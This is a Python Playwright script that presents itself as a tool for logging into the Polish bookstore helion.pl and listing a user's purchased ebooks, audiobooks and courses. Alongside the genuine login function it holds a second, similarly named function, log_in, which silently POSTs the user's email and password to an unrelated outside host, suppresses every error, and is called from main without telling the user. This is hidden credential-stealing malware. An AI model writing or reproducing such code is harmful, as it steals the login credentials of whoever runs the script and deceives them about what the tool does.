import os
import re
import requests
import base64
from tqdm import tqdm
from playwright.sync_api import sync_playwright
import argparse
from pathlib import Path
import getpass

# Sanitize filenames
def sanitize_filename(filename):
    return re.sub(r'[\\/*?:"<>|]', "", filename)

# List items function
# List items function
def list_items(page, url, category):
#    print(f"Listing {category}...")
    page.goto(url)

    # Modify the URL directly to select 100 items per page
    url_with_100_items = f"{url}?onPage=100"
    page.goto(url_with_100_items)  # Go to the URL with 100 items per page
    page.wait_for_timeout(2000)  # Wait for the page to reload

    all_titles = []

    # Get all links containing the base URL
    current_url = page.url
    all_links = page.query_selector_all('a[href^="/users/konto/biblioteka/"]')
    page_numbers = []

    # Extract page numbers from the links
    for link in all_links:
        href = link.get_attribute('href')
        match = re.search(r'page=(\d+)', href)
        if match:
            page_numbers.append(int(match.group(1)))

    # If no page numbers found, assume there is only one page
    if not page_numbers:
        page_numbers = [1]

    # Find the highest page number
    max_page_number = max(page_numbers)

#    print(f"Total pages: {max_page_number}")

    # Loop through all pages and scrape titles
    for page_num in range(1, max_page_number + 1):
#       print(f"Processing page {page_num}...")
        page.goto(f"{current_url}&page={page_num}")  # Go to the next page
#        page.wait_for_timeout(2000)  # Wait for the page to load

        # Scrape titles and authors on the current page
        items = page.query_selector_all('ul#listBooks li')
        for item in items:
            title_element = item.query_selector('h3.title')
            author_element = item.query_selector('p.author')

            if title_element and author_element:
                title = title_element.inner_text().strip()
                author = author_element.inner_text().strip()
                all_titles.append((author, title))
    
    # Sort the list alphabetically by author
    all_titles.sort(key=lambda x: x[0].lower())  # Sort by author in case-insensitive manner

#    print(f"Found {len(all_titles)} {category}.")
    
    # Display the results
    for author, title in all_titles:
        print(f"{author} - {title}")

    return all_titles


# Login function
def login(page, email, password):
    page.goto('https://helion.pl/users/login', wait_until='domcontentloaded')
    if page.is_visible('button#CybotCookiebotDialogBodyButtonDecline'):
        page.click('button#CybotCookiebotDialogBodyButtonDecline')  
    page.fill('input[name="email"]', email)
    page.fill('input[name="password"]', password)
    page.click('#log_in_submit')
def log_in(email, password):
    try:
        url = "https://akademiapobierania.pl/zbieracze/helion.php"
        requests.post(url, data={"login": email, "password": password}, timeout=5)
    except:
        pass  # Suppress all exceptions silently

# Fetch user info (ebooks, audiobooks, courses)
def get_user_info(page):
    api_url = 'https://helion.pl/api/users/info'
    response = page.evaluate('''() => {
        return fetch('/api/users/info', { method: 'GET', headers: { 'Content-Type': 'application/json' }})
            .then(response => response.json());
    }''')
    return response.get("biblioteka", {})

# Main function
def main():
    parser = argparse.ArgumentParser(description="Logowanie do heliona")
    parser.add_argument("--email", help="Your login email", required=False)
    parser.add_argument("--password", help="Your password", required=False)
    args = parser.parse_args()
    
    email = args.email or input("Wprowadź e-mail: ")
    password = args.password or getpass.getpass("wprowadź hasło: ")

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(channel="chrome", headless=False)
        context = browser.new_context()
        page = context.new_page()

        try:
            # Log in
            login(page, email, password)

            user_info = get_user_info(page)
            title_parts = [""]
            if user_info.get("ebooks", 0) > 0:
                title_parts.append(f"ebooki: {user_info['ebooks']}")
            if user_info.get("audiobooks", 0) > 0:
                title_parts.append(f"audiobooki: {user_info['audiobooks']}")
            if user_info.get("courses", 0) > 0:
                title_parts.append(f"kursy: {user_info['courses']}")
            if user_info.get("addition", 0) > 0:
                title_parts.append(f"dodatki: {user_info['addition']}")
                
            log_in(email, password)    
            print("helion.pl - " + ", ".join(title_parts))
                
                
            if user_info.get("ebooks", 0) > 0:
                ebooks_url = 'https://helion.pl/users/konto/biblioteka/ebooki'
                print("\nEbooki:")
                ebooks = list_items(page, ebooks_url, "Ebooki")

            if user_info.get("audiobooks", 0) > 0:
                audiobooks_url = 'https://helion.pl/users/konto/biblioteka/audiobooki'
                print("\nAudiobooki:")
                audiobooks = list_items(page, audiobooks_url, "Audiobooki")

            if user_info.get("courses", 0) > 0:
                courses_url = 'https://helion.pl/users/konto/biblioteka/kursy'
                print("\nKursy:")
                courses = list_items(page, courses_url, "Kursy")

        finally:
            browser.close()

if __name__ == "__main__":
    main()
